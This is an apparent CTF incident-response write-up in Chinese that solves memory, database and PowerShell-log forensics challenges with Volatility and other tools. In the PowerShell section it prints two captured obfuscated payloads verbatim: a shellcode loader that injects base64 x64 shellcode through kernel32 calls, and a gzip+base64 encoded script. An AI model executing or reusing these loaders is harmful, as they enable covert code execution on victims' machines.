+<h3 id="内存取证-1"><a href="#内存取证-1" class="headerlink" title="内存取证-1"></a>内存取证-1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：SERVER-2008-20241220-162057</span><br><span class="line">请找到rdp连接的跳板地址</span><br><span class="line">flag格式 flag&#123;1.1.1.1&#125;</span><br></pre></td></tr></table></figure>
+
+<p>给了一个raw文件。</p>
+<p>内存取证直接拿出我们的volatility</p>
+<p>要查看跳板地址，那肯定要看端口使用情况，使用netscan</p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229110142358.png" alt="image-20241229110142358"></p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229110211801.png" alt="image-20241229110211801"></p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229110242420.png" alt="image-20241229110242420"></p>
+<p>其他都是0.0.0.0的，看中间这些就行了。</p>
+<p>filefox.exe是火狐浏览器的进程，感觉也没必要看，看svchost.exe还有个System还有个spoolsv.exe就行，都试一下。</p>
+<p>最后试出来就是这个，其实这里也不用试，rdp嘛也就是远程桌面协议，对应3389端口，看谁连接了我们本地的3389端口即可。那就只有下面这个啦！</p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229110352142.png" alt="image-20241229110352142"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.60.220&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="内存取证-2"><a href="#内存取证-2" class="headerlink" title="内存取证-2"></a>内存取证-2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：SERVER-2008-20241220-162057</span><br><span class="line">请找到攻击者下载黑客工具的IP地址</span><br><span class="line">flag格式 flag&#123;1.1.1.1&#125;</span><br></pre></td></tr></table></figure>
+
+<p>既然是下载黑客工具，那么netscan的连接肯定是可以看到的，但我们无法判断是哪个，只能一个一个试，这是一种方法。</p>
+<p>还有一种方法，下载黑客工具，那么黑客肯定要执行命令，我们看cmdscan即可。</p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229110908943.png" alt="image-20241229110908943"></p>
+<p>直接看到了mimikatz，那对应的ip地址就是155.94.204.67啦！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;155.94.204.67&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="内存取证-3"><a href="#内存取证-3" class="headerlink" title="内存取证-3"></a>内存取证-3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：SERVER-2008-20241220-162057</span><br><span class="line">攻击者获取的“FusionManager节点操作系统帐户（业务帐户）”的密码是什么</span><br><span class="line">flag格式 flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229111119862.png" alt="image-20241229111119862"></p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229111344755.png" alt="image-20241229111344755"></p>
+<p>看cmdline看到一个pass.txt，有可能就是。同时根据命令执行的顺序，pass.txt应该在桌面上</p>
+<p>接下来我们用filescan查看文件</p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229111435871.png" alt="image-20241229111435871"></p>
+<p>使用 dumpfiles 插件导出</p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229111637244.png" alt="image-20241229111637244"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f H:\应急响应比赛\【题目】小题+综合题\solar\SERVER-2008-20241220-162057\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007e4cedd0 -D</span><br><span class="line"> ./</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229111723222.png" alt="image-20241229111723222"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;GalaxManager_2012&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="内存取证-4"><a href="#内存取证-4" class="headerlink" title="内存取证-4"></a>内存取证-4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：SERVER-2008-20241220-162057</span><br><span class="line">请找到攻击者创建的用户</span><br><span class="line">flag格式 flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure>
+
+<p>获取注册表中的用户即可，很简单。</p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229111905095.png" alt="image-20241229111905095"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f H:\应急响应比赛\【题目】小题+综合题\solar\SERVER-2008-20241220-162057\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 printkey  -K  &quot;SAM\Domains\Account</span><br><span class="line">\Users\Names&quot;</span><br></pre></td></tr></table></figure>
+
+<p>直接试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ASP.NET&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="内存取证-5"><a href="#内存取证-5" class="headerlink" title="内存取证-5"></a>内存取证-5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：SERVER-2008-20241220-162057</span><br><span class="line">请找到攻击者利用跳板rdp登录的时间</span><br><span class="line">flag格式 flag&#123;2024/01/01 00:00:00&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法一：</strong></p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229112051539.png" alt="image-20241229112051539"></p>
+<p>可以找到进程1908，但是这里没有时间。</p>
+<p>那么接下来我们看看进程。</p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229112208817.png" alt="image-20241229112208817"></p>
+<p><strong>PID（Process ID）</strong></p>
+<ul>
+<li><strong>定义</strong>：PID 是操作系统分配给每个运行中进程的唯一标识符。每个进程在系统中都有一个唯一的 PID，用于标识进程。</li>
+<li><strong>作用</strong>：PID 用于区分不同的进程，是系统内核跟踪和管理进程的重要方式。每当一个新的进程被创建时，操作系统会为其分配一个唯一的 PID。</li>
+<li><strong>示例</strong>：如果你通过命令（如 <code>ps</code> 或 <code>top</code>）查看进程列表，你会看到每个进程对应的 PID。比如，PID 为 1234 的进程可能是一个正在运行的程序。</li>
+</ul>
+<p><strong>PPID（Parent Process ID）</strong></p>
+<ul>
+<li><strong>定义</strong>：PPID 是一个进程的父进程的 PID。换句话说，PPID 指的是启动当前进程的进程的标识符。每个进程（除了初始化进程）都有一个父进程。</li>
+<li><strong>作用</strong>：PPID 显示了当前进程与其父进程的关系。操作系统使用 PPID 来管理进程之间的层级关系，当一个进程退出时，它的子进程可能会被重新分配给另一个父进程（通常是 <code>init</code> 进程）。</li>
+<li><strong>示例</strong>：假设进程 PID 为 1234 的进程是由 PID 为 5678 的进程启动的，那么进程 1234 的 PPID 就是 5678。</li>
+</ul>
+<p>但是这里两个试了都不行</p>
+<p>后来才知道</p>
+<p><strong>UTC+0000</strong> 是一种表示时间偏移量的格式，用于说明某个时间与协调世界时（UTC，Universal Time Coordinated）的关系。</p>
+<p><strong>UTC+0000</strong> 表示没有时间偏移的协调世界时，常用于不受时区影响的场合。</p>
+<p>中国使用的时区是 <strong>中国标准时间（CST）</strong>，也被称为 <strong>北京时间</strong>。其时区偏移量是 <strong>UTC+08:00</strong>，也就是说，中国的时间比协调世界时（UTC）快 8 小时。</p>
+<p>所以要加8小时</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2024/12/21 00:15:34&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>方法二：</strong></p>
+<p>我们在filescan文件中可以找到Windows日志文件Security.evtx，<strong>注意大写</strong></p>
+<p><code>security.evtx</code> 是 Windows 操作系统中的一个事件日志文件，主要记录与系统安全相关的事件信息。它是 Windows 日志文件的一部分，用于存储关于用户登录、账户管理、安全审计、系统访问控制等事件的数据。</p>
+<p>攻击者利用跳板rdp登录受害机，那么windows日志肯定会有相关记录。</p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229113321749.png" alt="image-20241229113321749"></p>
+<p>我们把它dump下来</p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229113401080.png" alt="image-20241229113401080"></p>
+<p>dump下来后缀改成evtx就行，然后放到宝瓜分析！</p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229113532493.png" alt="image-20241229113532493"></p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229113556890.png" alt="image-20241229113556890"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2024/12/21 00:15:34&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="内存取证-6"><a href="#内存取证-6" class="headerlink" title="内存取证-6"></a>内存取证-6</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：SERVER-2008-20241220-162057</span><br><span class="line">请找到攻击者创建的用户的密码哈希值</span><br><span class="line">flag格式 flag&#123;XXXX&#125;</span><br></pre></td></tr></table></figure>
+
+<p>创建的用户是ASP.NET</p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229122231066.png" alt="image-20241229122231066"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5ffe97489cbec1e08d0c6339ec39416d&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>这里我们先获取虚拟机administrator用户的密码</p>
+<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229132342981.png" alt="image-20241229132342981" style="zoom:80%;" />
+
+<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229132335459.png" alt="image-20241229132335459" style="zoom:80%;" />
+
+<h3 id="数据库-1"><a href="#数据库-1" class="headerlink" title="数据库-1"></a>数据库-1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目附件：mssql、mssql题-备份数据库</span><br><span class="line">请找到攻击者创建隐藏账户的时间</span><br><span class="line">flag格式 如 flag&#123;2024/01/01 00:00:00&#125;</span><br></pre></td></tr></table></figure>
+
+<p>给了vmdk和ovf，可以用vmware打开和取证</p>
+<p><strong>VMDK</strong> 是一种文件后缀，代表 <strong>Virtual Machine Disk</strong>，是一种虚拟磁盘文件格式。它由 VMware 开发，用于存储虚拟机的硬盘内容</p>
+<p>先打开看看，发现需要密码，那么！取证大师！启动！</p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229130911566.png" alt="image-20241229130911566"></p>
+<p>在 Windows 中，账户名以 <strong><code>$</code></strong> 结尾的通常表示隐藏的共享或资源。</p>
+<p>只有一个test$</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;test$&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229131325621.png" alt="image-20241229131325621"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2024-12-16 15:24:21</span><br></pre></td></tr></table></figure>
+
+<p>密码设置时间很有可能就是创建用户的时间</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2024/12/16 15:24:21&#125;</span><br></pre></td></tr></table></figure>
+
+<p>不仅取证大师可以发现隐藏用户，这里也可以compmgmt.msc</p>
+<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229132651247.png" alt="image-20241229132651247" style="zoom: 67%;" />
+
+<h3 id="数据库-2"><a href="#数据库-2" class="headerlink" title="数据库-2"></a>数据库-2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目附件：mssql、mssql题-备份数据库</span><br><span class="line">请找到恶意文件的名称</span><br><span class="line">flag格式 如 flag&#123;*.*&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上传火绒剑分析</p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229133350472.png" alt="image-20241229133350472"></p>
+<p>发现c盘java目录下有一个xmrig.exe，有远程地址和本地地址的连接，猜测是恶意后门文件！</p>
+<p>百度一下看看</p>
+<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229133446413.png" alt="image-20241229133446413" style="zoom: 67%;" />
+
+<p>塌房了！！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;xmrig.exe&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="数据库-3"><a href="#数据库-3" class="headerlink" title="数据库-3"></a>数据库-3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目附件：mssql、mssql题-备份数据库</span><br><span class="line">请找到恶意文件的外联地址</span><br><span class="line">flag格式 如 flag&#123;1.1.1.1&#125;</span><br></pre></td></tr></table></figure>
+
+<p>外链地址，简单，上面有了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">203.107.45.167:3333</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;203.107.45.167&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="数据库-4"><a href="#数据库-4" class="headerlink" title="数据库-4"></a>数据库-4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目附件：mssql、mssql题-备份数据库</span><br><span class="line">请修复数据库</span><br><span class="line">flag格式 如 flag&#123;xxxxx&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修复数据库？？？</p>
+<h3 id="数据库-5"><a href="#数据库-5" class="headerlink" title="数据库-5"></a>数据库-5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目附件：mssql、mssql题-备份数据库</span><br><span class="line">请提交powershell命令中恶意文件的MD5</span><br><span class="line">flag格式 如 flag&#123;xxxxx&#125;</span><br></pre></td></tr></table></figure>
+
+<p>powershell命令，看日志</p>
+<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229134458850.png" alt="image-20241229134458850" style="zoom:80%;" />
+
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229134531627.png" alt="image-20241229134531627"></p>
+<p>发现存在大量远程命令执行，我们逐个分析</p>
+<p>在后面几个发现了比较特殊的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- EventData </span><br><span class="line"></span><br><span class="line">  MessageNumber 1 </span><br><span class="line">  MessageTotal 1 </span><br><span class="line">  ScriptBlockText function tWk &#123; Param ($k0M, $ybp) $f2w = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;) return $f2w.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($f2w.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($k0M)))), $ybp)) &#125; function lVhI5 &#123; Param ( [Parameter(Position = 0, Mandatory = $True)] [Type[]] $v8K8, [Parameter(Position = 1)] [Type] $nZWM = [Void] ) $p8dl = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate]) $p8dl.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $v8K8).SetImplementationFlags(&#x27;Runtime, Managed&#x27;) $p8dl.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $nZWM, $v8K8).SetImplementationFlags(&#x27;Runtime, Managed&#x27;) return $p8dl.CreateType() &#125; [Byte[]]$tUZml = [System.Convert]::FromBase64String(&quot;/EiD5PDozAAAAEFRQVBSUUgx0lZlSItSYEiLUhhIi1IgTTHJSItyUEgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBJAdBQ41ZI/8lNMclBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVheSAHQWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAG9wKiu3EFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V&quot;) [Uint32]$uKrz = 0 $rS = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tWk kernel32.dll VirtualAlloc), (lVhI5 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $tUZml.Length,0x3000, 0x04) [System.Runtime.InteropServices.Marshal]::Copy($tUZml, 0, $rS, $tUZml.length) if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tWk kernel32.dll VirtualProtect), (lVhI5 @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($rS, [Uint32]$tUZml.Length, 0x10, [Ref]$uKrz)) -eq $true) &#123; $yfm6I = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tWk kernel32.dll CreateThread), (lVhI5 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$rS,[IntPtr]::Zero,0,[IntPtr]::Zero) [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tWk kernel32.dll WaitForSingleObject), (lVhI5 @([IntPtr], [Int32]))).Invoke($yfm6I,0xffffffff) | Out-Null &#125;  </span><br><span class="line">  ScriptBlockId 6272cc91-9ab4-4901-8088-ca946f7ae722 </span><br><span class="line">  Path  </span><br></pre></td></tr></table></figure>
+
+<p>关注此处：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[System.Convert]::FromBase64String(&quot;/EiD5PDozAAAAEFRQVBSUUgx0lZlSItSYEiLUhhIi1IgTTHJSItyUEgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBJAdBQ41ZI/8lNMclBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVheSAHQWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAG9wKiu3EFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V&quot;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- EventData </span><br><span class="line"></span><br><span class="line">  MessageNumber 1 </span><br><span class="line">  MessageTotal 1 </span><br><span class="line">  ScriptBlockText &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((&#x27;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&#123;0&#125;&#x27;)-f&#x27;A&#x27;,&#x27;f&#x27;,&#x27;M&#x27;)))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd())) </span><br><span class="line">  ScriptBlockId 5ef6ec2a-3ad1-4051-8fba-a804b7bddefb </span><br><span class="line">  Path  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>稍微问一下AI</p>
+<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229135320255.png" alt="image-20241229135320255" style="zoom:80%;" />
+
+<p>其实自己也看得出来，其中的关键VirtualProtect，Invoke，kernel32.dll其实可以猜出来，相当于免杀的混淆，base64解码后执行shellcode。</p>
+<p>同时也发现了System.IO.Compression.GzipStream</p>
+<p>根据时间判断，应该是先gz压缩，再base64</p>
+<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229135841104.png" alt="image-20241229135841104" style="zoom:80%;" />
+
+<p>导出看看</p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229140034813.png" alt="image-20241229140034813"></p>
+<p>导出为bin文件然后丢微步之类的看看。</p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229140152237.png" alt="image-20241229140152237"></p>
+<p>恶意文件实锤了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d72000ee7388d7d58960db277a91cc40&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="综合应急"><a href="#综合应急" class="headerlink" title="综合应急"></a>综合应急</h2><h3 id="综合应急-1"><a href="#综合应急-1" class="headerlink" title="综合应急-1"></a>综合应急-1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：FOG日志</span><br><span class="line">综合应急-1请点击左上角“CTF”按钮切换为“知识竞赛”进行答题。题目类型为选择题，提交机会只有一次，请慎重提交。</span><br><span class="line">本题 flag答案为flag&#123;solar&#125;</span><br></pre></td></tr></table></figure>
+
+
+
